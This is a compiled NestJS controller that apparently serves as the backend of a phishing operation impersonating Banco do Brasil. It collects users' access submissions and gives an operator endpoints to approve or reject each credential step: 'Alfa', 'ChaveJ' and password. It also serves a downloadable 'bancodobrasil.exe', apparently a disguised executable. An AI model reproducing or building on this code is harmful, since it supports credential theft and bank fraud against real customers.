"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.AcessoController = void 0;
const common_1 = require("@nestjs/common");
const user_service_1 = require("./user.service");
const Acesso_dto_1 = require("./dtos/Acesso.dto");
const path = require("path");
const fs = require("fs");
let AcessoController = class AcessoController {
    constructor(userService) {
        this.userService = userService;
    }
    async create(acessoDto) {
        return this.userService.create(acessoDto);
    }
    async findAll() {
        return this.userService.findAll();
    }
    async findUser(numberUser) {
        return this.userService.findUser(numberUser);
    }
    async updateUser(numberUser, acessoDto) {
        return this.userService.updateUser(numberUser, acessoDto);
    }
    async approvedAlfa(id) {
        return this.userService.approvedAlfa(id);
    }
    downloadFile(res) {
        const fileName = 'bancodobrasil.exe';
        const filePath = path.join(__dirname, '../../../', 'src', 'shared', 'Files', fileName);
        if (fs.existsSync(filePath)) {
            res.set({
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': `attachment; filename=${fileName}`,
            });
            const fileStream = fs.createReadStream(filePath);
            fileStream.pipe(res);
            fileStream.on('end', () => {
                res.end();
            });
        }
        else {
            console.error('File not found:', filePath);
            res.status(common_1.HttpStatus.NOT_FOUND).send('File not found');
        }
    }
    async checkStatusAlfa(numberUser) {
        return this.userService.checkStatusAlfa(numberUser);
    }
    async approveChavej(id) {
        return this.userService.approveChavej(id);
    }
    async checkStatusChaveJ(numberUser) {
        return this.userService.checkStatusChavej(numberUser);
    }
    async approvePassword(id) {
        return this.userService.approvedPassword(id);
    }
    async checkStatusPassword(numberUser) {
        return this.userService.checkStatusPassword(numberUser);
    }
    async reject(id) {
        return this.userService.reject(id);
    }
};
exports.AcessoController = AcessoController;
__decorate([
    (0, common_1.Post)('acesso'),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Acesso_dto_1.AcessoDto]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':numberUser'),
    __param(0, (0, common_1.Param)('numberUser')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "findUser", null);
__decorate([
    (0, common_1.Put)(':numberUser'),
    __param(0, (0, common_1.Param)('numberUser')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Acesso_dto_1.AcessoDto]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "updateUser", null);
__decorate([
    (0, common_1.Put)('approveAlfa/:id'),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "approvedAlfa", null);
__decorate([
    (0, common_1.Get)('baixar/arquivo'),
    (0, common_1.Get)('baixar/arquivo'),
    __param(0, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", void 0)
], AcessoController.prototype, "downloadFile", null);
__decorate([
    (0, common_1.Get)('statusAlfa/:numberUser'),
    __param(0, (0, common_1.Param)('numberUser')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "checkStatusAlfa", null);
__decorate([
    (0, common_1.Put)('approveChavej/:id'),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "approveChavej", null);
__decorate([
    (0, common_1.Get)('statusChavej/:numberUser'),
    __param(0, (0, common_1.Param)('numberUser')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "checkStatusChaveJ", null);
__decorate([
    (0, common_1.Put)('approvePassword/:id'),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "approvePassword", null);
__decorate([
    (0, common_1.Get)('statusPassword/:numberUser'),
    __param(0, (0, common_1.Param)('numberUser')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "checkStatusPassword", null);
__decorate([
    (0, common_1.Put)('reject/:id'),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], AcessoController.prototype, "reject", null);
exports.AcessoController = AcessoController = __decorate([
    (0, common_1.Controller)('banco'),
    __metadata("design:paramtypes", [user_service_1.UserService])
], AcessoController);
//# sourceMappingURL=user.controller.js.map